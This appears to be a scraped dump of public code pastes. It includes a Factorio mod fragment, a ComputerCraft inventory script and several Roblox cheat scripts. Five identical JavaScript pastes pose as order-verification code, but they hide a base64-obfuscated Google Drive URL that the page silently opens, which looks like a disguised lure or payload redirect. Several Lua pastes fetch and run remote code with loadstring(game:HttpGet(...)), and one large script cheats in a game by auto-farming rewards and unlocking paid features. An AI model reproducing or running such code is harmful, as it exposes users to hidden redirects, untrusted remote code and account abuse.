                    if not(moduleCat.name == ""hc-heating-coils"") then
                        
                        table.insert(machine.allowed_module_categories,moduleCat.name)
                    end
                end
            end
        end
    end"
XCEL2Huh,temp,pankovamg,Python,Wednesday 2nd of April 2025 08:45:13 AM CDT,print(78)
deF4iRNc,Untitled,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 08:11:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/098/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nnfQqhtm,MM2 murder and sheriff detection script kill all,ok76777,Lua,Wednesday 2nd of April 2025 08:06:38 AM CDT,"loadstring(game:HttpGet(""https://pastefy.app/JiHa0zo1/raw""))()"
uzYMfy2A,InventoryManager,DragonFromSpace,Lua,Wednesday 2nd of April 2025 08:06:37 AM CDT,"local InputInventoriesFileLocation = ""InventoryManager/InputInventories""
local IsInitialized = false
local StorageSystem

function GetInputInventories()
    inventoriesFile = fs.open(InputInventoriesFileLocation, ""r"")
    local inventories = {}

    while true do
        local line = inventoriesFile.readLine()
        if not line then break end --end loop when eof
        inventories[#inventories + 1] = line
    end

    inventoriesFile.close()
    return inventories
end

function DoesInputInventoryExist(inventoryName)
    local inventories = GetInputInventories()
    for k,v in pairs(inventories) do
        if(v == inventoryName) then
            return true
        end
    end

    return false
end

function indexOfTable(table, key)
    for k,v in ipairs(table) do
        if key == v then
            return k
        end
    end
end

function AddInputInventory(inventoryName)
    if(DoesInputInventoryExist()) then
        return ""Inventory with name: "" .. inventoryName .. "" Already added! Failed to add it.""
    end

    inventoriesFile = fs.open(InputInventoriesFileLocation, fs.exists(InputInventoriesFileLocation) and ""a"" or ""w"")
    inventoriesFile.write(inventoryName .. ""\n"")
    inventoriesFile.close()
    return ""Succesfully added inventory "" .. inventoryName
end

function RemoveInputInventory(inventoryName)
    if(not DoesInputInventoryExist()) then
        return ""Inventory with name: "" .. inventoryName .. "" doesn't exist. Failed to remove it.""
    end

    local inputInvs = GetInputInventories()
    local index = indexOfTable(inputInvs, inventoryName)

    --open file in r/w mode
    local file = fs.open(InputInventoriesFileLocation, ""r"")
    local fileContent = file.readAll()
    file.close()

    --rewrite entire file without specific line
    file = fs.open(InputInventoriesFileLocation, ""w"")
    for i=1,#fileContent do
        if(i ~= index) then
            file.write(fileContent[i])
        end
    end
    file.close()
end

function Initialize()
    StorageSystem = peripheral.find(""inventory"", function(name,peripheral) return string.find(name, ""sophisticatedstorage"") end)
    IsInitialized = true
end

function Update()
    --pull all items from InputInventories into storage system
    --local allInputInventories = GetInputInventories()
    --local inputInv
    --for k,v in pairs(allInputInventories) do
    --    inputInv = peripheral.wrap()
    --end
end"
aWYwPvdc,Order.js,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 07:39:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/249/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
erXqiwqc,Untitled,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 07:09:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yJ6t3JQi,Products.js,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 06:53:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/157/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0WtmfDby,Market.js,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 06:22:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/255/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PnBqxPWJ,dataNone,TestGuy1,JSON,Wednesday 2nd of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '6d835b37f9f60d49d39c3a601e7b325919b6ac02b739e72764795821f207aaa64e8bb49e244be8514b688f250e988caac467e270f8548fb5de126a0c6c5577aafc18fc6b090805af60371d60cf849fadd8ea0adde7f124f23b4dcfee8832b032a891bbcb97d8638b746ead7fd828e2bb29b2aec05e82cbabbf0a2b5034031bde',
  otherdata: [
    '6977c33c491be14a756450560a55d454',
    '0b34caa09bdf9133a3b438f081349c59',
    '094251805cb1eaee1a5211ee4e99e1d5',
    '6b2d6378b2b2f4d1e87e5ef4e006c07c',
    '4a151fab4fa4a01233c96c6162b562d4',
    'bb344cc0b81e4ffab67a6c1f62014c3f',
    'e6baa91f546499bbfdb2088c13463deb',
    '92b8b63a19e4b5969b93cf1f1ea13530'
  ]
}"
1RUrt9h0,temporary_files_4.5.1,chen399d,Lua,Wednesday 2nd of April 2025 05:53:11 AM CDT,"loadstring(game:HttpGet('https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E6%9B%B4%E6%96%B0%E8%A8%8A%E6%81%AFUI%E6%A8%A1%E7%B5%84.lua'))()
UpdTitleUI(""Notice!! ~ !!"")
UpdtextUI(""You are currently using a temporary patch version ~ "")
UpdtextUI(""This version has been fixed and is now functional ~ "")
UpdtextUI(""Please switch to the official version to receive the latest updates ~ "")
UpdtextUI(""Thank you for your support :)"")
showUItimes(5)

local library = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E6%89%8B%E6%A9%9F%E7%AB%AFUI/imgui_en%E9%9D%A2%E6%9D%BF.lua"", true))();
function showNotification(message)
	local screenGui = Instance.new(""ScreenGui"");
	screenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"");
	local notification = Instance.new(""Frame"");
	notification.Size = UDim2.new(0, 300, 0, 50);
	notification.Position = UDim2.new(1, -320, 1, -120);
	notification.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
	notification.BackgroundTransparency = 0.5;
	notification.BorderSizePixel = 0;
	notification.Parent = screenGui;
	local label = Instance.new(""TextLabel"");
	label.Size = UDim2.new(1, 0, 1, 0);
	label.Position = UDim2.new(0, 0, 0, 0);
	label.Text = message;
	label.TextColor3 = Color3.fromRGB(255, 255, 255);
	label.BackgroundTransparency = 1;
	label.Font = Enum.Font.GothamBold;
	label.TextScaled = true;
	label.Parent = notification;
	task.delay(3, function()
		notification:Destroy();
	end);
end
local RespawPoint = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E6%89%8B%E6%A9%9F%E7%AB%AFUI/%E9%85%8D%E7%BD%AE%E4%B8%BB%E5%A0%B4%E6%99%AF.lua""))();
loadstring(game:HttpGet(""https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E6%89%8B%E6%A9%9F%E7%AB%AFUI/%E4%BB%BB%E5%8B%99%E8%87%AA%E5%8B%95%E9%A0%98%E5%8F%96.lua""))();
local JsonHandler = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/JSON%E6%A8%A1%E7%B5%84.lua""))();
local AntiAFK = game:GetService(""VirtualUser"");
game.Players.LocalPlayer.Idled:Connect(function()
	AntiAFK:CaptureController();
	AntiAFK:ClickButton2(Vector2.new());
	wait(2);
end);
local window = library:AddWindow(""Cultivation-Simulator script "", {main_color=Color3.fromRGB(41, 74, 122),min_size=Vector2.new(408, 335),can_resize=false});
local features = window:AddTab(""Rdme"");
local features1 = window:AddTab(""Main"");
local features2 = window:AddTab(""World"");
local features3 = window:AddTab(""Dungeons"");
local features4 = window:AddTab(""Pull"");
local features5 = window:AddTab(""Misc"");
local features6 = window:AddTab(""UI"");
local features7 = window:AddTab(""Set"");
local workspace = game:GetService(""Workspace"");
local player = game:GetService(""Players"").LocalPlayer;
local Players = game.Players;
local localPlayer = game.Players.LocalPlayer;
local playerGui = player.PlayerGui;
local RespawPointnum = RespawPoint:match(""%d+"");
print(""重生點編號："" .. RespawPointnum);
local reworld = workspace:waitForChild(""主場景"" .. RespawPointnum):waitForChild(""重生点"");
local TPX, TPY, TPZ = reworld.Position.X, reworld.Position.Y + 5, reworld.Position.Z;
local Restart = false;
local finishworldnum;
local values = player:WaitForChild(""值"");
local privileges = values:WaitForChild(""特权"");
local gowordlevels = 1;
local isDetectionEnabled = true;
local playerInRange = false;
local timescheck = 0;
local hasPrintedNoPlayer = false;
local savemodetime = 3;
local savemodetime2 = 0;
local savemodebutton;
local function checkPlayersInRange()
	local character = localPlayer.Character;
	if (not character or not character:FindFirstChild(""HumanoidRootPart"")) then
		return;
	end
	local boxPosition = character.HumanoidRootPart.Position;
	local boxSize = Vector3.new(500, 500, 500) / 2;
	playerInRange = false;
	for _, player in pairs(Players:GetPlayers()) do
		if ((player ~= localPlayer) and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"")) then
			local playerPosition = player.Character.HumanoidRootPart.Position;
			local inRange = (math.abs(playerPosition.X - boxPosition.X) <= boxSize.X) and (math.abs(playerPosition.Y - boxPosition.Y) <= boxSize.Y) and (math.abs(playerPosition.Z - boxPosition.Z) <= boxSize.Z);
			if inRange then
				playerInRange = true;
				break;
			end
		end
	end
	if playerInRange then
		if (timescheck == 0) then
			print(""有玩家在範圍內"");
			showNotification(""somepeople in range"");
			savemodetime2 = 2;
			savemodetime = 5;
			timescheck = 1;
			hasPrintedNoPlayer = true;
		end
	elseif (timescheck == 1) then
		print(""範圍內玩家已離開"");
		showNotification(""player out of range"");
		timescheck = 0;
		savemodetime2 = 0;
		hasPrintedNoPlayer = false;
	end
end
local function setupRangeDetection()
	while true do
		if isDetectionEnabled then
			checkPlayersInRange();
		end
		wait(0.1);
	end
end
local function toggleDetection()
	isDetectionEnabled = not isDetectionEnabled;
	print(""檢測已"" .. ((isDetectionEnabled and ""啟用"") or ""關閉""));
	if not isDetectionEnabled then
		savemodetime = 3;
		savemodetime2 = 0;
	end
end
local function getGiftCountdown(index)
	local gift = Online_Gift:FindFirstChild(""Online_Gift"" .. index);
	if not gift then
		return nil;
	end
	local countdownText = gift:FindFirstChild(""按钮""):FindFirstChild(""倒计时"").Text;
	if (countdownText == ""CLAIMED!"") then
		return 0;
	elseif (countdownText == ""DONE"") then
		local args = {[1]=index};
		game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\232\138\130\230\151\165\230\180\187\229\138\168""):FindFirstChild(""\233\162\134\229\143\150\229\165\150\229\138\177""):FireServer(unpack(args));
		return 0;
	else
		local minutes, seconds = countdownText:match(""^(%d+):(%d+)$"");
		if (minutes and seconds) then
			return (tonumber(minutes) * 60) + tonumber(seconds);
		end
	end
	return nil;
end
local function checkOnlineGiftcountdown()
	local minCountdown = math.huge;
	local Countdown = {};
	for i = 1, 6 do
		local totalSeconds = getGiftCountdown(i);
		if totalSeconds then
			Countdown[i] = totalSeconds;
			OnlineGift_data[i] = totalSeconds;
			if ((totalSeconds < minCountdown) and (totalSeconds > 0)) then
				minCountdown = totalSeconds;
			end
		else
			Countdown[i] = nil;
		end
	end
	if (minCountdown ~= math.huge) then
		if localCountdownActive then
			for i = 1, 6 do
				if (Countdown[i] and (Countdown[i] > 0)) then
					Countdown[i] = Countdown[i] - 1;
					local minutes = math.floor(Countdown[i] / 60);
					local seconds = Countdown[i] % 60;
					local formattedTime = string.format(""%02d:%02d"", minutes, seconds);
					Online_Gift:FindFirstChild(""Online_Gift"" .. i):FindFirstChild(""按钮""):FindFirstChild(""倒计时"").Text = formattedTime;
				end
			end
			minCountdown = minCountdown - 1;
		else
		end
	end
end
local function chaangeonlinegiftname()
	for i = 1, 6 do
		local giftName = ""在线奖励0"" .. i;
		local gift = Online_Gift:FindFirstChild(giftName);
		if gift then
			gift.Name = ""Online_Gift"" .. tostring(gift.LayoutOrder + 1);
			print(""名稱已更改為："" .. gift.Name);
		else
			allGiftsExist = false;
			break;
		end
	end
	if allGiftsExist then
		print(""在線獎勵--名稱--已全部更改"");
	else
		print(""名稱已重複或部分名稱不存在"");
	end
end
local function checkTimeAndRun()
	spawn(function()
		while true do
			local currentTime = os.time();
			local utcTime = os.date(""!*t"", currentTime);
			local utcPlus8Time = os.date(""*t"", currentTime + (8 * 3600));
			if ((utcPlus8Time.hour == 0) and (utcPlus8Time.min == 0)) then
				print(""UTC+8 時間為 00:00，開始執行更新數據..."");
				spawn(function()
					allGiftsExist = true;
					chaangeonlinegiftname();
					wait(1);
					checkOnlineGiftcountdown();
				end);
				wait(60);
			end
			wait(1);
		end
	end);
end
checkTimeAndRun();
features:Show();
features:AddLabel(""Author： Tseting-nil  |  Version：V4.5.1"");
features:AddLabel(""AntiAFK：Start"");
features:AddLabel(""Created on： 2024/09/27"");
features:AddLabel(""Last Updated： 2025/04/01"");
local timeLabel = features:AddLabel(""Current Time： 00/00/00 00:00:00"");
local timezoneLabel = features:AddLabel(""Time Zone： UTC+00:00"");
local function getFormattedTime()
	return os.date(""%Y/%m/%d %H:%M:%S"");
end
local function getLocalTimezone()
	local offset = os.date(""%z"");
	return string.format(""UTC%s"", offset:sub(1, 3) .. "":"" .. offset:sub(4, 5));
end
local function updateLabel()
	timeLabel.Text = ""Current Time："" .. getFormattedTime();
	timezoneLabel.Text = ""Time Zone："" .. getLocalTimezone();
end
spawn(function()
	while true do
		updateLabel();
		wait(1);
	end
end);
local AddLabelfeatures = features:AddLabel(""重生點：重生點"");
AddLabelfeatures.Text = ""重生點："" .. RespawPoint .. "" -- If TP Error.Return home and Use TP FIX button"";
local function Respawn_Point()
	RespawPoint = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E6%89%8B%E6%A9%9F%E7%AB%AFUI/%E9%85%8D%E7%BD%AE%E4%B8%BB%E5%A0%B4%E6%99%AF.lua""))();
	AddLabelfeatures.Text = ""重生點："" .. RespawPoint .. "" -- If TP Error.Return home and Use TP FIX button"";
	print(""最近的出生點："" .. RespawPoint);
	RespawPointnum = RespawPoint:match(""%d+"");
	print(""重生點編號："" .. RespawPointnum);
	reworld = workspace:waitForChild(""主場景"" .. RespawPointnum):waitForChild(""重生点"");
	TPX, TPY, TPZ = reworld.Position.X, reworld.Position.Y + 5, reworld.Position.Z;
	print(""傳送座標："" .. TPX .. "" "" .. TPY .. "" "" .. TPZ);
	player.Character:WaitForChild(""HumanoidRootPart"").CFrame = CFrame.new(TPX, TPY, TPZ);
end
features:AddButton(""TP FIX"", function()
	Respawn_Point();
end);
local function updateButtonText()
	if isDetectionEnabled then
		savemodebutton.Text = ""Status：Safe Mode Enabled"";
		showNotification(""Safe Mode Enabled"");
	else
		savemodebutton.Text = ""Status：Safe Mode Disabled"";
		showNotification(""Safe Mode Disabled"");
	end
end
savemodebutton = features:AddButton(""Status：Safe Mode Enabled "", function()
	inRange = false;
	playerInRange = false;
	timescheck = 0;
	hasPrintedNoPlayer = false;
	toggleDetection();
	updateButtonText();
end);
updateButtonText();
spawn(setupRangeDetection);
local screenGui = Instance.new(""ScreenGui"");
screenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"");
local blackBlock = Instance.new(""Frame"");
blackBlock.Size = UDim2.new(200, 0, 200, 0);
blackBlock.Position = UDim2.new(0, 0, 0, 0);
blackBlock.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
blackBlock.Visible = false;
blackBlock.Parent = screenGui;
features:AddButton(""Black Screen: On/Off"", function()
	blackBlock.Visible = not blackBlock.Visible;
end);
local timeLabel = features1:AddLabel(""Time until auto-fetch: 0 seconds"");
local playerGui = game.Players.LocalPlayer.PlayerGui;
local Online_Gift = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""节日活动商店""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""在线奖励""):WaitForChild(""列表"");
local Gife_check = false;
local countdownList = {};
local hasExecutedToday = false;
local lastExecutedDay = os.date(""%d"");
local function convertToSeconds(timeText)
	local minutes, seconds = string.match(timeText, ""(%d+):(%d+)"");
	if (minutes and seconds) then
		return (tonumber(minutes) * 60) + tonumber(seconds);
	end
	return nil;
end
local function GetOnlineGiftCountdown()
	hasExecutedToday = true;
	local minTime = math.huge;
	for i = 1, 6 do
		local rewardName = string.format(""在线奖励%02d"", i);
		local rewardFolder = Online_Gift:FindFirstChild(rewardName);
		if rewardFolder then
			local button = rewardFolder:FindFirstChild(""按钮"");
			local countdown = button and button:FindFirstChild(""倒计时"");
			if countdown then
				local countdownText = countdown.Text;
				countdownList[rewardName] = countdownText;
				if string.match(countdownText, ""CLAIMED!"") then
				elseif string.match(countdownText, ""DONE"") then
					minTime = math.min(minTime, 0);
				elseif string.match(countdownText, ""%d+:%d+"") then
					local totalSeconds = convertToSeconds(countdownText);
					if totalSeconds then
						minTime = math.min(minTime, totalSeconds);
					end
				end
			end
		end
	end
	return ((minTime < math.huge) and minTime) or nil;
end
local minCountdown = GetOnlineGiftCountdown();
local nowminCountdown = minCountdown;
local function Online_Gift_start()
	local newMinCountdown = GetOnlineGiftCountdown();
	if (newMinCountdown and (newMinCountdown == minCountdown)) then
		nowminCountdown = nowminCountdown - 1;
	else
		minCountdown = newMinCountdown;
		nowminCountdown = minCountdown;
	end
	if (nowminCountdown and (nowminCountdown > 0)) then
		timeLabel.Text = string.format(""Time until auto-fetch: %d seconds"", nowminCountdown);
	elseif (nowminCountdown and (nowminCountdown <= 0)) then
		timeLabel.Text = ""Countdown complete, preparing to receive rewards"";
		for i = 1, 6 do
			local args = {[1]=i};
			game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\232\138\130\230\151\165\230\180\187\229\138\168""):FindFirstChild(""\233\162\134\229\143\150\229\165\150\229\138\177""):FireServer(unpack(args));
		end
	else
		timeLabel.Text = ""All rewards collected"";
		Gife_check = false;
	end
end
local function Online_Gift_check()
	while Gife_check do
		Online_Gift_start();
		wait(1);
	end
end
features1:AddButton(""Auto-collect online rewards"", function()
	Gife_check = true;
	spawn(Online_Gift_check);
end);
local function CheckAllRewardsCompleted()
	local allCompleted = true;
	GetOnlineGiftCountdown();
	for i = 1, 6 do
		local rewardName = string.format(""在线奖励%02d"", i);
		local status = countdownList[rewardName];
		if (not status or not string.match(status, ""DONE"")) then
			allCompleted = false;
			break;
		end
	end
	if allCompleted then
		print(""All online rewards have been collected！"");
		Gife_check = false;
	end
end
spawn(function()
	while Gife_check and not hasExecutedToday do
		CheckAllRewardsCompleted();
		wait(60);
	end
end);
spawn(function()
	while true do
		local currentUTCHour = tonumber(os.date(""!*t"").hour);
		local currentUTCDate = os.date(""!*t"").day;
		local currentLocalHour = currentUTCHour + 8;
		if (currentLocalHour >= 24) then
			currentLocalHour = currentLocalHour - 24;
		end
		local currentLocalDate = currentUTCDate;
		if (currentLocalHour == 0) then
			if (lastExecutedDay ~= currentLocalDate) then
				hasExecutedToday = false;
				print(""UTC+8 00:00，自動領取在線獎勳"");
				Gife_check = true;
				lastExecutedDay = currentLocalDate;
			end
		end
		wait(60);
	end
end);
local Autocollmission = features1:AddSwitch(""Auto-collect tasks (GamePass tasks and Gift)"", function(bool)
	Autocollmissionbool = bool;
	if Autocollmissionbool then
		spawn(function()
			while Autocollmissionbool do
				mainmissionchack();
				everydaymission();
				gamepassmission();
				gamepassgiftget();
				wait(1);
			end
		end);
	end
end);
Autocollmission:Set(false);
local invest = features1:AddSwitch(""Auto-execute investments"", function(bool)
	investbool = bool;
	if investbool then
		spawn(function()
			while investbool do
				for i = 1, 3 do
					local args = {i};
					game:GetService(""ReplicatedStorage"")[""\228\186\139\228\187\182""][""\229\133\172\231\148\168""][""\229\149\134\229\186\151""][""\233\147\182\232\161\140""][""\233\162\134\229\143\150\231\144\134\232\180\162""]:FireServer(unpack(args));
				end
				wait(5);
				for i = 1, 3 do
					local args = {i};
					game:GetService(""ReplicatedStorage"")[""\228\186\139\228\187\182""][""\229\133\172\231\148\168""][""\229\149\134\229\186\151""][""\233\147\182\232\161\140""][""\232\180\173\228\185\176\231\144\134\232\180\162""]:FireServer(unpack(args));
				end
				wait(600);
			end
		end);
	end
end);
invest:Set(false);
local AutoCollectherbs = features1:AddSwitch(""Auto-harvest herbs"", function(bool)
	AutoCollectherbsbool = bool;
	if AutoCollectherbsbool then
		spawn(function()
			while AutoCollectherbsbool do
				for i = 1, 6 do
					local args = {[1]=i,[2]=nil};
					game:GetService(""ReplicatedStorage"")[""\228\186\139\228\187\182""][""\229\133\172\231\148\168""][""\229\134\156\231\148\176""][""\233\135\135\233\155\134""]:FireServer(unpack(args));
					wait(0.1);
				end
				wait(60);
			end
		end);
	end
end);
AutoCollectherbs:Set(false);
features1:AddLabel(""- - GamePass Unlock"");
local Refining = features1:AddSwitch(""Unlock Auto-Crafting"", function(bool)
	local Refiningbool = bool;
	privileges:WaitForChild(""超级炼制"").Value = false;
	privileges:WaitForChild(""自动炼制"").Value = Refiningbool;
end);
Refining:Set(true);
local showAll = features1:AddSwitch(""Show all Currencies"", function(bool)
	ShowAllbool = bool;
	if ShowAllbool then
		while ShowAllbool do
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\230\180\187\229\138\168\231\137\169\229\147\129""].Visible = true;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\231\159\191\231\159\179""].Visible = false;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\231\172\166\231\159\179\231\178\137\230\156\171""].Visible = true;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\231\173\137\231\186\167""].Visible = true;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\231\180\171\233\146\187""].Visible = true;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\232\141\137\232\141\175""].Visible = false;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\233\135\145\229\184\129""].Visible = true;
			game:GetService(""Players"").LocalPlayer.PlayerGui.GUI[""\228\184\187\231\149\140\233\157\162""][""\228\184\187\229\159\142""][""\232\180\167\229\184\129\229\140\186\229\159\159""][""\233\146\187\231\159\179""].Visible = true;
			wait(0.3);
		end
	end
end);
showAll:Set(false);
features1:AddButton(""Remove the display of the reward"", function()
	local target1 = playerGui.GUI:WaitForChild(""二级界面""):FindFirstChild(""展示奖励界面"");
	if target1 then
		target1:Destroy();
		print(""成功刪除 UI 元件"");
	else
		print(""已刪除過"");
	end
end);
features1:AddButton(""Redeem Game Code"", function()
	local gamecode = {""ilovethisgame"",""welcome"",""30klikes"",""40klikes"",""halloween"",""artistkapouki"",""45klikes"",""60klikes""};
	for i = 1, #gamecode do
		print(gamecode[i]);
		local args = {[1]=gamecode[i]};
		game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\230\191\128\230\180\187\231\160\129""):FindFirstChild(""\231\142\169\229\174\182\229\133\145\230\141\162\230\191\128\230\180\187\231\160\129""):FireServer(unpack(args));
	end
end);
local worldnum = player:WaitForChild(""值""):WaitForChild(""主线进度""):WaitForChild(""world"").Value;
local newworldnum = worldnum;
local function statisticsupdata()
	worldnum = player:WaitForChild(""值""):WaitForChild(""主线进度""):WaitForChild(""world"").Value;
end
spawn(function()
	while true do
		statisticsupdata();
		wait(1);
	end
end);
local infBattle_ON = false;
local infBattle = 0.7;
local Difficulty_choose = features2:AddLabel(""Current Selection： 01"");
local function gowordlevelscheak(gowordlevels)
	if (gowordlevels > worldnum) then
		if (gowordlevels < 10) then
			Difficulty_choose.Text = ""Level Not Unlocked： 0"" .. gowordlevels;
		else
			Difficulty_choose.Text = ""Level Not Unlocked： "" .. gowordlevels;
		end
	elseif (gowordlevels < 10) then
		if infBattle_ON then
			Difficulty_choose.Text = ""Current Selection： 0"" .. gowordlevels .. ""    Infinite Battle Wave Set： "" .. (infBattle * 100) .. "" Waves"";
		else
